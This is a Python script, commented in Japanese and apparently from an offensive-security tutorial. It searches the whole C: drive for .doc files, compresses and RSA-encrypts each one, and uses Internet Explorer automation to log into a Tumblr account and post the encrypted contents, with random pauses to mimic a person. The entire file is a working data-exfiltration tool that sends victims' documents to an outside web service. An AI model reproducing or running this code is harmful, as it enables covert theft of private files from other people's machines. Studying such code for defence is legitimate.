#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import time
import zlib

import fnmatch
import random
import win32com.client
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

doc_type = ".doc"
username = "user.name@gmail.com"
password = "password"

public_key = ""


def wait_for_browser(browser):
    # ブラウザがページをロードし終えるのを待つ
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encrypt_string(plaintext):
    chunk_size = 256

    print("Compressing: %d bytes" % len(plaintext))
    plaintext = zlib.compress(plaintext)

    print("Encrypting %d bytes" % len(plaintext))

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset + chunk_size]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted += rsakey.encrypt("base64")
    print("Base64 encoded crypto: %d" % len(encrypted))

    return encrypted


def encrypt_post(filename):
    # ファイルを開いて読み取る
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):
    # Webページ中のすべての要素を取得
    full_doc = ie.Document.all

    # ログインフォームの検索を繰り返し行う
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    try:
        # 異なるWebページが表示されることがあるための対応箇所
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()

    except IndexError:
        pass

    random_sleep()

    # ログイン用のフォームはWebページ内の2番目のフォーム
    wait_for_browser(ie)

    return


def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print("Set text area")
            i.focus()
        elif i.id == "create_post":
            print("Found post button")
            post_form = i
            i.focus()

    # フォーカスをメインのコンテキストメニューから外す
    random_sleep()
    title_box.focus()
    random_sleep()

    # フォームを投稿する
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # Tumblrにアクセスしてログイン
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print("Logging in...")
    login_to_tumblr(ie)
    print("Logged in...navigating")

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # ファイルを暗号化
    title, body = encrypt_post(document_path)

    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")

    # IEのインスタンスを終了
    ie.Quit()
    ie = None

    return


# 文書ファイルの検索用のループ処理
# 注：最初の行にタブは不要
for parent, dorectories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print("Found: %s" % document_path)
        exfiltrate(document_path)
        input("Continue?")
